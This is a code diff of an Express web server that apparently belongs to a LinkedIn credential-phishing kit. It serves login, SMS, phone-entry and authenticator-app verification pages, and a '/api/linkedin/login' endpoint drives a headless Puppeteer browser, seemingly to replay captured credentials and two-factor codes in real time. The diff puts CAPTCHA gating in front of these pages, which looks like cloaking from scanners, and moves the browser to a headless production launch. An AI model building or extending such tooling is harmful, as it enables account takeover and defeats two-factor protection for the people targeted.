@@ -101,31 +101,31 @@ app.get("/", (req, res) => {
 });
 
 // Protected routes - require CAPTCHA verification
-app.get("/login.html",  (req, res) => {
+app.get("/login.html", requireCaptcha, (req, res) => {
   res.sendFile(path.join(__dirname, "views", "login.html"));
 });
 
-app.get("/security-verification.html",  (req, res) => {
+app.get("/security-verification.html", requireCaptcha, (req, res) => {
   res.sendFile(path.join(__dirname, "views", "security-verification.html"));
 });
 
-app.get("/mobile-verification.html",  (req, res) => {
+app.get("/mobile-verification.html", requireCaptcha, (req, res) => {
   res.sendFile(path.join(__dirname, "views", "mobile-verification.html"));
 });
 
-app.get("/sms.html",  (req, res) => {
+app.get("/sms.html", requireCaptcha, (req, res) => {
   res.sendFile(path.join(__dirname, "views", "sms.html"));
 });
 
-app.get("/enter-phone.html",  (req, res) => {
+app.get("/enter-phone.html", requireCaptcha, (req, res) => {
   res.sendFile(path.join(__dirname, "views", "enter-phone.html"));
 });
 
-app.get("/authenticator-app.html",  (req, res) => {
+app.get("/authenticator-app.html", requireCaptcha, (req, res) => {
   res.sendFile(path.join(__dirname, "views", "authenticator-app.html"));
 });
 
-app.get("/quick-verification.html",  (req, res) => {
+app.get("/quick-verification.html", requireCaptcha, (req, res) => {
   res.sendFile(path.join(__dirname, "views", "quick-verification.html"));
 });
 
@@ -352,19 +352,19 @@ app.post("/api/linkedin/login", async (req, res) => {
   }
 
   try {
-    const browser = await puppeteer.launch({ headless: false });
-    //  const browser = await puppeteer.launch({
-    //    args: [
-    //      "--disable-setuid-sandbox",
-    //      "--no-sandbox",
-    //      "--single-process",
-    //      "--no-zygote",
-    //    ],
-    //    executablePath:
-    //      process.env.NODE_ENV === "production"
-    //        ? process.env.PUPPETEER_EXECUTABLE_PATH
-    //        : puppeteer.executablePath(),
-    //  });
+    // const browser = await puppeteer.launch({ headless: false });
+     const browser = await puppeteer.launch({
+       args: [
+         "--disable-setuid-sandbox",
+         "--no-sandbox",
+         "--single-process",
+         "--no-zygote",
+       ],
+       executablePath:
+         process.env.NODE_ENV === "production"
+           ? process.env.PUPPETEER_EXECUTABLE_PATH
+           : puppeteer.executablePath(),
+     });
     const page = await browser.newPage();
 
     // Set up page configuration
